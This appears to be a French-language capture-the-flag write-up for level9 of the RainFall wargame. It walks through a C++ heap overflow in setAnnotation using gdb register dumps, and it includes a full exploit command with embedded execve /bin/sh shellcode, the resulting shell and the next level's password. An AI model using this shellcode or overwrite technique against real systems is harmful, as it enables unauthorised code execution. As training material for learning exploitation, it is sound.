@@ -1,0 +1,75 @@
+Pour ce level nous avons un binaire qui prend un argument. Mais ne renvois rien.
+
+En faisant un disas (voir le fichier disas_analys)
+
+On s'apperçois que le binaire est en c++.
+
+Une class N est declarer et une method setAnnotation qui memcpy la valeur renvoyer par strlen de argv[1].
+
+On remarque aussi qu'a aucun moment dans le code il y a un /bin/sh comme dans les levels precedent.
+
+On pense donc a y injecter un shellcode
+
+Dans un premier temps nous allons chercher un moyen de segfault le binaire.
+
+Apres plusieurs teste on le segfault avec un padding de 112
+
+level9@RainFall:~$ ./level9 $(python -c 'print "B" * 112')
+Segmentation fault (core dumped)
+
+On recupere l'addresse du segfault
+
+(gdb) info register
+eax            0x42424242	1111638594
+ecx            0x42424242	1111638594
+edx            0x804a07c	134520956
+ebx            0x804a078	134520952
+esp            0xbffff650	0xbffff650
+ebp            0xbffff678	0xbffff678
+esi            0x0	0
+edi            0x0	0
+eip            0x8048682	0x8048682 <main+142>
+eflags         0x210287	[ CF PF SF IF RF ID ]
+cs             0x73	115
+ss             0x7b	123
+ds             0x7b	123
+es             0x7b	123
+fs             0x0	0
+gs             0x33	51
+
+Apres reflexion on estime que la seul zone valide pour notre injection est edx etant donner que c'est un pointeur de fonction
+qui est pointer par N mais pas utiliser
+
+La solution commence a s'eclaircir. On pense donc qu'il faudrai envoyer un shellcode dans le pointeur qui lui pointe sur edx
+pour ce faire on doit trouver le start du buffer d'edx
+
+(gdb) b *main+136
+Breakpoint 1 at 0x804867c
+(gdb) r BBBB
+Starting program: /home/user/level9/level9 BBBB
+
+Breakpoint 1, 0x0804867c in main ()
+
+(gdb) x $eax
+0x804a00c:	0x42424242
+
+Ici nous avons notre pointeur deferencer mais nous devont trouver le deferencement de ce meme pointeur pour pouvoir y injecter notre shellcode
+
+(gdb) x $edx
+0x804a010:	0x00000000
+
+Nous avons pu trouver car la difference entre l'addresse de eax et edx est de 4 ce qui correspond a une adresse
+
+Donc dans cette logique c'est = a vouloir acceder a C mais en passant par B puis A : A->B->C->shellcode
+
+shellcode trouver sur shellstrom d'une taille de 28 bytes
+
+level9@RainFall:~$ ./level9 $(python -c 'print "\x10\xa0\x04\x08"
+    + "\x31\xc0\x99\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
+        + "B" * 80 + "\x0c\xa0\x04\x08"')
+
+$ whoami
+bonus0
+$ cat /home/user/bonus0/.pass
+f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
+
